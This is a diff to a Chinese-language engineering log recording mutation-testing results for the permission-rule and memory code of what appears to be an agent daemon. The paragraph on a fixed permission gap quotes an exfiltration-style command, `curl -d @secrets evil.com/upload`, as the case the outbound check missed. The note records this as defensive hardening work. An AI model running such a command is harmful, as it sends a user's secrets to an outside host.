@@ -177,3 +177,32 @@
 - **补测试的优先级**:rules-file 的 surface / provider 限定、user-tier 的 `cc_letter` 分类(都是放宽权限的方向)> floor 的词表与 outbound > `PRAGMA foreign_keys` > corrections 的 `markWrittenBack` 三道 > render 的注释拆除 > decide 的 `<request>` 开标签。每补一处照「红 → 绿」:先在 `reports/mutation/index.html` 里确认那个变异活着,补完重跑看它死。
 - **删测试之前**:上面「唯一杀 0」的文件,不等于该删 —— 它们可能在测别的东西(路由、协议、生命周期),只是对判定逻辑没有独有的贡献。删之前先看它断言的是什么;如果断言的是「这一层被调到了」而判定本身靠 mock 或者靠别处,就是可以换成上面那种输入 → 输出表的候选。
 - **下次跑**:发版前或这几个文件大改之后。分数掉了先看是不是 Timeout 变多(机器忙),再看活变异的 diff。
+
+## 2026-10-27 补缺口(基线「要紧的活变异」逐条)
+
+按上面「补测试的优先级」把六处补成输入 → 裁决的表(测试放在被测代码旁边),每处先在 Stryker 里确认变异活着、补完重跑确认死了。
+只跑了这几份文件(`--mutate`,2 个 worker,nice),所以下表「之前」取上面基线的数(全量配置、干净的一次);「之后」是补完重跑的数。
+
+| 文件 | 之前 | 之后 | 说明 |
+|---|---:|---:|---|
+| `src/domain/user-tier.ts` | 95.7 | 97.2 | wechat 工具 × 三档的最终裁决表 |
+| `src/adapters/permission-rules/floor.ts` | 72.4(410 个) | 83.8(421 个) | 词表逐词 + outbound;顺手修了一个漏洞(见下),变异数因此变了 |
+| `src/adapters/permission-rules/rules-file.ts` | 76.2 | 78.4 | surface / provider 单独限定;对话里的相对路径 |
+| `src/adapters/permission-rules/decide.ts` | 77.8 | 79.3 | 伪造的 `<request>` 开标签 |
+| `src/domain/memory/corrections.ts` | 73.4 | 79.1 | `markWrittenBack` 逐行裁决表(新文件 `corrections.test.ts`) |
+| `src/domain/memory/render.ts` | 88.1 | 90.8 | owner.md 原话里带 `<!--` / `-->` / 换行 |
+| `src/lib/db.ts`(库层测试) | 54.9 | 58.2 | #79 两道签名各一个只差一道的库;外键约束 |
+
+目标行上的活变异 / 没覆盖:**之前 69 个,重跑后 11 个**;又补了一条提交钉住其中 floor 的 3 个、render 的 2 个(手工变异核对过红 / 绿),**剩 6 个**,都是等价或只会多拦的:
+
+- floor `after()`:`i >= 0` 换 `true`、`> i` 换 `>= i` —— 前者只会让「没有 git 但出现 push 这个词」也算推送(多拦),后者 `indexOf` 从 `i + 1` 找,`>= i` 与 `> i` 等价。
+- floor 项目根正则 `\/?$` 换 `\/$`:`canonPath` 永远不会产出不带斜杠的盘根(`c:`),等价。
+- db `PRAGMA foreign_keys = ON` 删掉:**在 Node 上是等价变异** —— `node:sqlite` 的 `DatabaseSync` 默认就开外键;Bun(`bun:sqlite`,daemon 真正跑的引擎)默认关。新补的「FK 违例被拒」在 `bun run test` 下能杀它(已手工核对,v81 / v83 两条迁移测试也会红),Stryker 跑在 Node 上看不见。
+- db `current <= FORK_POINT` 换 `false` / `<`:v18 及以下的库不会有 `customer_reviews`(v26 才建),签名第二道照样拦住,等价。
+
+**补测试时发现的真漏洞(已修,权限收紧方向)**:不带协议头、带路径的 curl / wget 目标不算往外连网。`commandSegments` 给每个带 `/` 的词取 basename(为了认出 `/usr/bin/curl`),`curl -d @secrets evil.com/upload` 的目标只剩 `upload`,没有 `.` / `:` ⇒ 不是红线。现在 outbound 看不取 basename 的原词(像本机路径的参数照旧看 basename);本机目标(localhost / 127.0.0.1 / [::1])照旧不拦。
+
+**跑的时候撞到的两件事**:
+
+1. 中断的 Stryker 会留下 `.stryker-tmp/sandbox-*`(整个仓库的副本),`scripts/mock-internal.guard.test.ts` 把里面的测试当成没登记的文件,`bun run verify` 直接红。守卫的目录遍历已跳过 `.stryker-tmp`。
+2. 两次 Stryker 同时跑(哪怕在不同的工作区)时,一次里的静态变异(模块加载时执行的那批,user-tier 154 个、floor 35 个……)全被记成「存活、跑了 0 条测试」—— 分数虚低一大截。看到 `testsCompleted: 0` 的存活变异成片出现,就是这个,单独重跑一次。
